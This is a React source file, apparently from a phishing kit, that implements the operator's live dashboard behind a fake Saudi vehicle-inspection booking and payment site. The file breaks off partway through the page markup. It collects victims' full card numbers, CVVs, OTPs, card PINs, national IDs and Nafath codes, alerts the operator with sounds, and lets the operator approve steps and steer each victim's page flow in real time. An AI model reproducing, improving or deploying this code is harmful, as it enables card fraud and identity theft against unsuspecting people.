import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import {
  ShieldAlert,
  Lock,
  Unlock,
  KeyRound,
  Activity,
  Clock,
  CheckCircle,
  XCircle,
  Database,
  Search,
  RefreshCw,
  Terminal,
  ArrowRight,
  AlertTriangle,
  Flame,
  User,
  Hash,
  Calendar,
  Layers,
  Sparkles,
  Fingerprint,
  Volume2,
  VolumeX,
  Smartphone,
  Play,
  Bell,
  ArrowUp,
  ArrowDown,
  Trash2,
  RotateCcw,
  Save,
  Check,
  ChevronDown,
  ChevronUp
} from 'lucide-react';
import { CreditCard3D } from './CreditCard3D';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED' | 'AWAITING_PIN' | 'PIN_SUBMITTED';
  otpCode: string;
  submittedOtp?: string;
  cardPin?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
  nafathAdminApproved?: boolean;
  bookingMeta?: {
    region?: string;
    city?: string;
    center?: string;
    vehicleType?: string;
    dateTime?: string;
  } | null;
  personalInfo?: {
    fullName?: string;
    idNumber?: string;
    mobile?: string;
    email?: string;
    nationality?: string;
    isDelegated?: boolean;
    delegatedDetails?: {
      type?: 'citizen' | 'resident';
      name?: string;
      mobile?: string;
      nationality?: string;
      id?: string;
      birthDate?: string;
    } | null;
  } | null;
  vehicleInfo?: {
    status?: 'istimara' | 'customs';
    plateArabic?: string;
    plateEnglish?: string;
    plateNumbers?: string;
  } | null;
}

// Custom browser synthesized alerts using Web Audio API
const playNotificationSound = (type: 'nafath' | 'card' | 'otp') => {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return;
    const ctx = new AudioContextClass();
    const now = ctx.currentTime;
    
    if (type === 'nafath') {
      // Gentle majestic digital double bell (C5 -> E5 -> G5)
      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(523.25, now); // C5
      osc1.frequency.exponentialRampToValueAtTime(659.25, now + 0.18); // E5
      gain1.gain.setValueAtTime(0.12, now);
      gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
      osc1.connect(gain1);
      gain1.connect(ctx.destination);
      osc1.start(now);
      osc1.stop(now + 0.5);

      const osc2 = ctx.createOscillator();
      const gain2 = ctx.createGain();
      osc2.type = 'triangle';
      osc2.frequency.setValueAtTime(783.99, now + 0.12); // G5
      gain2.gain.setValueAtTime(0.05, now + 0.12);
      gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
      osc2.connect(gain2);
      gain2.connect(ctx.destination);
      osc2.start(now + 0.12);
      osc2.stop(now + 0.5);
    } else if (type === 'card') {
      // Tech-y payment slide / crisp swoop (D4 -> A5)
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(293.66, now); // D4
      osc.frequency.exponentialRampToValueAtTime(880, now + 0.22); // A5
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.3);
    } else if (type === 'otp') {
      // Fast high attention sonar beeps (C6 -> E6 -> G6)
      [0, 0.08, 0.16].forEach((delay, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        const freqs = [1046.50, 1318.51, 1567.98]; // C6, E6, G6
        osc.frequency.setValueAtTime(freqs[idx], now + delay);
        gain.gain.setValueAtTime(0.08, now + delay);
        gain.gain.exponentialRampToValueAtTime(0.001, now + delay + 0.07);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(now + delay);
        osc.stop(now + delay + 0.07);
      });
    }
  } catch (err) {
    console.error("Audio playback error:", err);
  }
};

export const AdminPortal: React.FC = () => {
  const navigate = useNavigate();
  const [injectedMsg, setInjectedMsg] = useState<string | null>(null);

  const injectMockBookingState = () => {
    const mockState = {
      serviceId: 'periodic-inspection',
      selectedCenter: {
        id: 'riyadh-north',
        name: 'مركز فحص شمال الرياض - الياسمين',
        city: 'الرياض',
        address: 'طريق الملك عبدالعزيز الفرعي، حي الياسمين',
        workingHours: 'من 7:00 ص حتى 11:00 م',
        distance: '4.2 كم',
        mapUrl: 'https://maps.google.com'
      },
      bookingMeta: {
        plateNumber: 'أ ب ج 1 2 3 4',
        chassisNumber: 'KNDJP32427654321',
        ownerName: 'عبدالله محمد الحربي',
        phone: '0501234567',
        email: 'customer@example.com',
        appointmentDate: '2026-06-30',
        appointmentTime: '10:30 ص',
        serviceName: 'فحص دوري للمركبة (سيارة صغيرة)',
        amount: '150.00'
      }
    };
    localStorage.setItem('last_booking_state', JSON.stringify(mockState));
    setInjectedMsg('✅ تم حقن بيانات الحجز والسيارة بنجاح!');
    setTimeout(() => setInjectedMsg(null), 3000);
  };

  const injectMockTransaction = (status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED' | 'AWAITING_PIN' | 'PIN_SUBMITTED') => {
    const mockTx = {
      id: 'tx_dev_' + Math.floor(Math.random() * 100000),
      cardNumber: '4000 1234 5678 9010',
      cardholderName: 'عبدالله محمد الحربي',
      expiry: '12/29',
      cvv: '123',
      cardType: 'mada',
      amount: 150.00,
      timestamp: new Date().toISOString(),
      status: status,
      otpCode: '4829',
      nationalId: '1023456789',
      nafathCode: '42',
      nafathVerified: status === 'NAFATH_VERIFIED' || status === 'APPROVED',
      serviceName: 'فحص دوري للمركبة (سيارة صغيرة)',
      bookingMeta: {
        region: 'منطقة مكة المكرمة',
        city: 'مكة المكرمة - الشرائع',
        center: 'مكة المكرمة - الشرائع',
        vehicleType: 'سيارة صغيرة خاصة',
        dateTime: '2026-06-27 09:30 صباحاً'
      },
      personalInfo: {
        fullName: 'عبدالله محمد الحربي',
        idNumber: '1023456789',
        mobile: '+966501234567',
        email: 'customer@example.com',
        nationality: 'سعودي',
        isDelegated: false
      },
      vehicleInfo: {
        status: 'istimara',
        plateArabic: 'أ ب ج',
        plateEnglish: 'A B J',
        plateNumbers: '1234'
      }
    };
    localStorage.setItem('last_tx', JSON.stringify(mockTx));
    setInjectedMsg(`✅ تم حقن عملية دفع وهمية بحالة: [${status}]`);
    setTimeout(() => setInjectedMsg(null), 3000);
  };

  const handlePageClick = (path: string) => {
    if (['/booking-summary', '/nafath-login'].includes(path)) {
      if (!localStorage.getItem('last_booking_state')) {
        injectMockBookingState();
      }
    } else if (['/nafath-code', '/checkout', '/waiting', '/otp', '/success', '/card-pin'].includes(path)) {
      let reqStatus: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED' | 'AWAITING_PIN' | 'PIN_SUBMITTED' = 'PENDING_CARD_APPROVAL';
      if (path === '/nafath-code') reqStatus = 'AWAITING_NAFATH';
      if (path === '/card-pin') reqStatus = 'AWAITING_PIN';
      if (path === '/otp') reqStatus = 'AWAITING_OTP';
      if (path === '/success') reqStatus = 'APPROVED';
      
      if (!localStorage.getItem('last_tx')) {
        injectMockTransaction(reqStatus);
      }
    }
    navigate(path);
  };

  // Access control state
  const [accessCode, setAccessCode] = useState('');
  const [hasAccess, setHasAccess] = useState(false);
  const [accessError, setAccessError] = useState<string | null>(null);
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);

  // Dashboard states
  interface ActiveUser {
    sessionId: string;
    fullName: string;
    phone: string;
    pageTitle: string;
    pagePath: string;
    lastActive: string;
  }
  const [activeUsers, setActiveUsers] = useState<ActiveUser[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('All');
  const [expandedBookings, setExpandedBookings] = useState<Record<string, boolean>>({});
  const [actionBusy, setActionBusy] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  // Auto scroll/track state for OTP submissions
  const [isLiveMonitoring, setIsLiveMonitoring] = useState(true);

  // Nafath setting states
  const [nafathCodeInput, setNafathCodeInput] = useState('26');
  const [isUpdatingNafath, setIsUpdatingNafath] = useState(false);
  const [nafathConfigError, setNafathConfigError] = useState<string | null>(null);
  const [nafathConfigSuccess, setNafathConfigSuccess] = useState<string | null>(null);

  // Sound and tracking system states & refs
  const [isAudioEnabled, setIsAudioEnabled] = useState(true);
  const [isDevToolsExpanded, setIsDevToolsExpanded] = useState(() => localStorage.getItem('admin_is_dev_tools_expanded') === 'true');
  const [showStats, setShowStats] = useState(() => localStorage.getItem('admin_show_stats') !== 'false');
  const [showSoundTester, setShowSoundTester] = useState(() => localStorage.getItem('admin_show_sound_tester') === 'true');
  const [showNafathCode, setShowNafathCode] = useState(() => localStorage.getItem('admin_show_nafath_code') === 'true');
  const lastSeenStatuses = useRef<{[txId: string]: string}>({});
  const initialFetchDone = useRef(false);

  // Tab controller
  const [activeAdminTab, setActiveAdminTab] = useState<'monitors' | 'flow'>(() => {
    return (localStorage.getItem('admin_active_tab') as 'monitors' | 'flow') || 'monitors';
  });

  // Page Flow States
  interface FlowPage {
    id: string;
    title: string;
    path: string;
  }
  const [activeFlow, setActiveFlow] = useState<FlowPage[]>([]);
  const [availableToAdding, setAvailableToAdding] = useState<FlowPage[]>([
    { id: 'add-card-pin', title: 'رمز البطاقة (PIN)', path: '/card-pin' },
    { id: 'add-pin-processing', title: 'صفحة معالجة رمز البطاقة (PIN)', path: '/pin-processing' },
    { id: 'add-nafath-login', title: 'تسجيل دخول نفاذ', path: '/nafath-login' },
    { id: 'add-nafath-code', title: 'رمز مطابقة نفاذ', path: '/nafath-code' },
    { id: 'add-home', title: 'الرئيسية (بيانات الحجز الأولى)', path: '/appointment' },
    { id: 'add-centers', title: 'مراكز الفحص (اختيار المركز)', path: '/centers' },
    { id: 'add-customer', title: 'بيانات العميل (رقم الجوال واللوحة)', path: '/customer-info' },
    { id: 'add-fees', title: 'رسوم الفحص الدوري والخدمات', path: '/fees' },
    { id: 'add-pay', title: 'بوابة الدفع الإلكتروني (مدى / فيزا)', path: '/payment' },
    { id: 'add-wait', title: 'صفحة معالجة الدفع والتحقق', path: '/processing' },
    { id: 'add-otp', title: 'نافذة رمز التحقق والـ OTP', path: '/verification' },
    { id: 'add-success', title: 'تأكيد نجاح الحجز والباركود', path: '/success' },
  ]);
  const [isFetchingFlow, setIsFetchingFlow] = useState(false);
  const [isSavingFlow, setIsSavingFlow] = useState(false);
  const [flowSuccessMsg, setFlowSuccessMsg] = useState<string | null>(null);
  const [flowErrorMsg, setFlowErrorMsg] = useState<string | null>(null);

  const fetchFlowConfig = async () => {
    setIsFetchingFlow(true);
    try {
      const res = await fetch('/api/flow-config');
      if (res.ok) {
        const data = await res.json();
        if (data && data.activeFlow) {
          setActiveFlow(data.activeFlow);
        }
      }
    } catch (err) {
      console.error('Error fetching flow config:', err);
    } finally {
      setIsFetchingFlow(false);
    }
  };

  const handleMoveUp = (index: number) => {
    if (index === 0) return;
    const newFlow = [...activeFlow];
    const temp = newFlow[index];
    newFlow[index] = newFlow[index - 1];
    newFlow[index - 1] = temp;
    setActiveFlow(newFlow);
  };

  const handleMoveDown = (index: number) => {
    if (index === activeFlow.length - 1) return;
    const newFlow = [...activeFlow];
    const temp = newFlow[index];
    newFlow[index] = newFlow[index + 1];
    newFlow[index + 1] = temp;
    setActiveFlow(newFlow);
  };

  const handleDeleteFlowPage = (index: number) => {
    const newFlow = activeFlow.filter((_, i) => i !== index);
    setActiveFlow(newFlow);
  };

  const handleAddFlowPage = (page: { title: string; path: string }) => {
    const newId = `custom-${Date.now()}`;
    const newFlow = [...activeFlow, { id: newId, title: page.title, path: page.path }];
    setActiveFlow(newFlow);
  };

  const handleResetFlow = async () => {
    setIsSavingFlow(true);
    setFlowErrorMsg(null);
    setFlowSuccessMsg(null);
    try {
      const res = await fetch('/api/flow-config/reset', { method: 'POST' });
      if (res.ok) {
        const data = await res.json();
        if (data && data.activeFlow) {
          setActiveFlow(data.activeFlow);
          setFlowSuccessMsg('تمت إعادة الترتيب للوضع الافتراضي بنجاح');
          setTimeout(() => setFlowSuccessMsg(null), 3000);
        }
      } else {
        setFlowErrorMsg('فشل إعادة تعيين الترتيب الافتراضي.');
      }
    } catch (err) {
      setFlowErrorMsg('خطأ في الاتصال بالخادم.');
    } finally {
      setIsSavingFlow(false);
    }
  };

  const handleSaveFlow = async () => {
    setIsSavingFlow(true);
    setFlowErrorMsg(null);
    setFlowSuccessMsg(null);
    try {
      const res = await fetch('/api/flow-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flow: activeFlow })
      });
      if (res.ok) {
        const data = await res.json();
        if (data && data.activeFlow) {
          setActiveFlow(data.activeFlow);
          setFlowSuccessMsg('تم حفظ الترتيب بنجاح!');
          setTimeout(() => setFlowSuccessMsg(null), 3000);
        }
      } else {
        setFlowErrorMsg('فشل حفظ الترتيب الجديد.');
      }
    } catch (err) {
      setFlowErrorMsg('خطأ في الاتصال بالخادم لحفظ البيانات.');
    } finally {
      setIsSavingFlow(false);
    }
  };

  const fetchNafathConfig = async () => {
    try {
      const res = await fetch('/api/nafath-config');
      if (res.ok) {
        const data = await res.json();
        if (data && data.currentCode) {
          setNafathCodeInput(data.currentCode);
        }
      }
    } catch (err) {
      console.error('Error fetching Nafath config:', err);
    }
  };

  const handleUpdateNafathCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!nafathCodeInput.trim()) {
      setNafathConfigError('Please enter a valid code');
      return;
    }
    setIsUpdatingNafath(true);
    setNafathConfigError(null);
    setNafathConfigSuccess(null);

    try {
      const res = await fetch('/api/nafath-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentCode: nafathCodeInput.trim() })
      });
      const data = res.ok ? await res.json() : null;
      if (res.ok && data?.success) {
        setNafathConfigSuccess('Nafath code updated successfully!');
        setTimeout(() => setNafathConfigSuccess(null), 3000);
      } else {
        setNafathConfigError('Failed to update Nafath code.');
      }
    } catch (err) {
      setNafathConfigError('Network error updating Nafath code.');
    } finally {
      setIsUpdatingNafath(false);
    }
  };

  // Check code submission
  const handleVerifyAccess = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifyingCode(true);
    setAccessError(null);

    setTimeout(() => {
      if (accessCode === '222000') {
        setHasAccess(true);
        setIsVerifyingCode(false);
      } else {
        setAccessError('ACCESS DENIED: Invalid Administrative Credential Code.');
        setIsVerifyingCode(false);
      }
    }, 800);
  };

  // Fetch transactions from server
  const fetchTransactions = async () => {
    try {
      const res = await fetch('/api/admin/transactions');
      if (res.ok) {
        const data: Transaction[] = await res.json();
        
        if (initialFetchDone.current) {
          const prevStatuses = lastSeenStatuses.current;
          let playSound: 'nafath' | 'card' | 'otp' | null = null;
          
          data.forEach(tx => {
            const lastStatus = prevStatuses[tx.id];
            
            if (lastStatus === undefined) {
              // Brand new transaction entry!
              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
                playSound = 'nafath';
              } else if (tx.status === 'OTP_SUBMITTED') {
                playSound = 'otp';
              } else {
                playSound = 'card';
              }
            } else if (lastStatus !== tx.status) {
              // Status transition change!
              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
                playSound = 'nafath';
              } else if (tx.status === 'OTP_SUBMITTED') {
                playSound = 'otp';
              } else if (tx.status === 'PENDING_CARD_APPROVAL') {
                playSound = 'card';
              }
            }
            
            // Record current state status
            prevStatuses[tx.id] = tx.status;
          });
          
          lastSeenStatuses.current = { ...prevStatuses };
          
          if (playSound && isAudioEnabled) {
            playNotificationSound(playSound);
          }
        } else {
          // Initialize first-load state map without firing alarms
          const initialMap: {[txId: string]: string} = {};
          data.forEach(tx => {
            initialMap[tx.id] = tx.status;
          });
          lastSeenStatuses.current = initialMap;
          initialFetchDone.current = true;
        }

        setTransactions(data);
        setIsLoading(false);
      }
    } catch (err) {
      console.error('Error fetching transactions:', err);
    }
  };

  const fetchActiveUsers = async () => {
    try {
      const res = await fetch('/api/active-users');
      if (res.ok) {
        const data = await res.json();
        setActiveUsers(data || []);
      }
    } catch (err) {
      console.error('Error fetching active users:', err);
    }
  };

  // Setup auto-polling every 2 seconds
  useEffect(() => {
    if (!hasAccess) return;

    fetchTransactions();
    fetchNafathConfig();
    fetchFlowConfig();
    fetchActiveUsers();
    const interval = setInterval(() => {
      fetchTransactions();
      fetchActiveUsers();
    }, 2000);

    return () => clearInterval(interval);
  }, [hasAccess]);

  // Sync selected transaction with its latest updated polling state
  useEffect(() => {
    if (selectedTx && transactions.length > 0) {
      const latest = transactions.find(t => t.id === selectedTx.id);
      if (latest) {
        setSelectedTx(latest);
      }
    }
  }, [transactions]);

  // Sync section toggles with header-dispatched state events
  useEffect(() => {
    const handleSync = () => {
      setShowStats(localStorage.getItem('admin_show_stats') !== 'false');
      setShowSoundTester(localStorage.getItem('admin_show_sound_tester') === 'true');
      setShowNafathCode(localStorage.getItem('admin_show_nafath_code') === 'true');
      setIsDevToolsExpanded(localStorage.getItem('admin_is_dev_tools_expanded') === 'true');
      setActiveAdminTab((localStorage.getItem('admin_active_tab') as 'monitors' | 'flow') || 'monitors');
    };
    window.addEventListener('admin-state-changed', handleSync);
    return () => window.removeEventListener('admin-state-changed', handleSync);
  }, []);

  // Handle action state updates
  const handleUpdateStatus = async (status: Transaction['status']) => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, status }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`Transaction state successfully synchronized to ${status}.`);
        // update local list immediately
        setTransactions(prev =>
          prev.map(t => (t.id === selectedTx.id ? { ...t, status } : t))
        );
        setSelectedTx(prev => (prev ? { ...prev, status } : null));
      } else {
        setActionError(data.error || 'Failed to update transaction status.');
      }
    } catch (err) {
      setActionError('Network error syncing status packet to central gateway.');
    } finally {
      setActionBusy(false);
    }
  };

  // Handle Nafath custom code update
  const handleUpdateTxNafathCode = async (code: string) => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, nafathCode: code }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
        setTransactions(prev =>
          prev.map(t => (t.id === selectedTx.id ? { ...t, nafathCode: code } : t))
        );
        setSelectedTx(prev => (prev ? { ...prev, nafathCode: code } : null));
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update Nafath code.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error updating Nafath code.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Handle action state updates for a specific transaction
  const handleUpdateTxStatusDirect = async (txId: string, status: Transaction['status']) => {
    if (actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: txId, status }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث حالة المعاملة بنجاح.`);
        // update local list immediately
        setTransactions(prev =>
          prev.map(t => (t.id === txId ? { ...t, status, nafathVerified: status === 'NAFATH_VERIFIED' ? true : t.nafathVerified } : t))
        );
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update transaction status.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error syncing status.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Handle Nafath custom code update for a specific transaction
  const handleUpdateTxNafathCodeDirect = async (txId: string, code: string) => {
    if (actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: txId, nafathCode: code }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
        setTransactions(prev =>
          prev.map(t => (t.id === txId ? { ...t, nafathCode: code } : t))
        );
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update Nafath code.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error updating Nafath code.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Handle approving Nafath transition to next page
  const handleApproveNafathTransition = async (txId: string) => {
    if (actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: txId, status: 'NAFATH_VERIFIED', nafathAdminApproved: true }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم السماح للعميل بالانتقال للصفحة التالية بنجاح.`);
        setTransactions(prev =>
          prev.map(t => (t.id === txId ? { ...t, status: 'NAFATH_VERIFIED', nafathVerified: true, nafathAdminApproved: true } : t))
        );
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to approve Nafath transition.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error approving Nafath transition.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Format card types helper
  const getCardTypeColor = (type: string) => {
    switch (type) {
      case 'visa': return 'text-blue-400 border-blue-500/20 bg-blue-500/5';
      case 'mastercard': return 'text-amber-400 border-amber-500/20 bg-amber-500/5';
      case 'amex': return 'text-emerald-400 border-emerald-500/20 bg-emerald-500/5';
      case 'discover': return 'text-orange-400 border-orange-500/20 bg-orange-500/5';
      default: return 'text-slate-400 border-slate-500/20 bg-slate-500/5';
    }
  };

  // Filter list
  const filteredTx = transactions.filter(tx => {
    const matchesSearch =
      tx.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardholderName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardNumber.includes(searchTerm);

    if (statusFilter === 'All') return matchesSearch;
    return matchesSearch && tx.status === statusFilter;
  });

  // Entrance Security Guard UI
  if (!hasAccess) {
    return (
      <div className="flex min-h-[calc(100vh-140px)] items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md border border-slate-800 bg-slate-900/40 p-8 backdrop-blur-xl rounded-3xl shadow-2xl shadow-indigo-950/20 relative overflow-hidden"
          id="security-entrance-box"
        >
          {/* Cyber lines decor */}
          <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-indigo-500 via-rose-500 to-emerald-500 opacity-60" />

          <div className="text-center mb-8">
            <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 mb-4 animate-pulse">
              <ShieldAlert className="h-7 w-7" />
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight">Administrative Terminal</h2>
            <p className="text-xs text-slate-400 mt-2 leading-relaxed">
              Secure mainframe interface. Authorized credit auditing personnel only. Authentication challenge active.
            </p>
          </div>

          <form onSubmit={handleVerifyAccess} className="space-y-6">
            <div>
              <label className="block text-[11px] font-mono tracking-widest text-slate-400 uppercase mb-2">
                MAIN FRAME SECURITY CODE:
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-slate-500">
                  <KeyRound className="h-4 w-4" />
                </div>
                <input
                  type="password"
                  required
                  value={accessCode}
                  onChange={(e) => setAccessCode(e.target.value)}
                  placeholder="••••••"
                  maxLength={10}
                  className="block w-full h-12 pl-10 pr-4 text-center font-mono font-bold tracking-[0.5em] text-white placeholder-slate-600 bg-slate-950 border border-slate-800 rounded-xl focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition"
                  id="admin-access-code-input"
                />
              </div>
            </div>

            {accessError && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center space-x-2"
              >
                <XCircle className="h-4 w-4 shrink-0" />
                <span className="font-mono text-[10px] uppercase leading-relaxed">{accessError}</span>
              </motion.div>
            )}

            <button
              type="submit"
              disabled={isVerifyingCode}
              className="w-full h-12 rounded-xl bg-gradient-to-r from-indigo-600 to-rose-600 hover:from-indigo-500 hover:to-rose-500 text-white font-bold text-xs tracking-widest uppercase transition-all shadow-lg hover:shadow-indigo-500/10 disabled:opacity-50 flex items-center justify-center space-x-2"
              id="admin-auth-submit-btn"
            >
              {isVerifyingCode ? (
                <>
                  <RefreshCw className="h-4 w-4 animate-spin" />
                  <span>DECRYPTING SECURE MATRIX...</span>
                </>
              ) : (
                <>
                  <Unlock className="h-4 w-4" />
                  <span>AUTHORIZE MAIN SESSION</span>
                </>
              )}
            </button>
          </form>


        </motion.div>
      </div>
    );
  }

  // Admin Dashboard Command Center UI
  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
      {/* Upper Status strip bar */}
      <div className="mb-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-900/30 border border-slate-800/80 rounded-2xl p-4 backdrop-blur-md">
        <div className="flex items-center space-x-3.5">
          <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 relative">
            <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500" />
            </span>
            <Activity className="h-5.5 w-5.5" />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h2 className="text-md font-bold text-white tracking-tight uppercase">لوحة التحكم والمراقبة الفورية</h2>
              <span className="text-[9px] font-mono font-bold bg-indigo-950 text-indigo-400 px-1.5 py-0.5 rounded border border-indigo-500/30">ADMIN PORTAL</span>
            </div>
            <p className="text-[10px] font-mono text-slate-400">REAL-TIME CENTRAL DECISION DECK • ACTIVE AUTO-POLL (2S)</p>
          </div>
        </div>

        {/* Sync panel details */}
        <div className="flex items-center gap-3 self-end md:self-auto">
          <button
            onClick={() => setIsAudioEnabled(!isAudioEnabled)}
            className={`h-8 px-3 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-all ${
              isAudioEnabled
                ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                : 'bg-rose-500/10 border-rose-500/20 text-rose-400'
            }`}
          >
            {isAudioEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
            <span>{isAudioEnabled ? 'النظام الصوتي نشط' : 'كتم أصوات التنبيه'}</span>
          </button>
          
          <div className="flex items-center space-x-2">
            <button
              onClick={() => setIsLiveMonitoring(!isLiveMonitoring)}
              className={`h-8 px-3 rounded-lg text-[10px] font-mono font-bold border transition-all ${
                isLiveMonitoring
                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                  : 'bg-slate-950 border-slate-800 text-slate-500'
              }`}
            >
              {isLiveMonitoring ? '● MONITORING SYNC ACTIVE' : '○ SYNC PAUSED'}
            </button>
            <button
              onClick={fetchTransactions}
              className="p-2 rounded-lg bg-slate-950 hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-white transition cursor-pointer"
              title="Manual refresh"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>



      {activeAdminTab === 'monitors' ? (
        <>
          <AnimatePresence initial={false}>
            {/* Real-time stats widgets */}
            {showStats && (
              <motion.div
                initial={{ height: 0, opacity: 0, marginBottom: 0 }}
                animate={{ height: "auto", opacity: 1, marginBottom: 24 }}
                exit={{ height: 0, opacity: 0, marginBottom: 0 }}
                transition={{ duration: 0.3, ease: "easeInOut" }}
                className="overflow-hidden"
              >
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-right">
                  <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
                    <div className="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
                      <Activity className="w-5 h-5 animate-pulse" />
                    </div>
                    <div>
                      <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">العمليات النشطة</p>
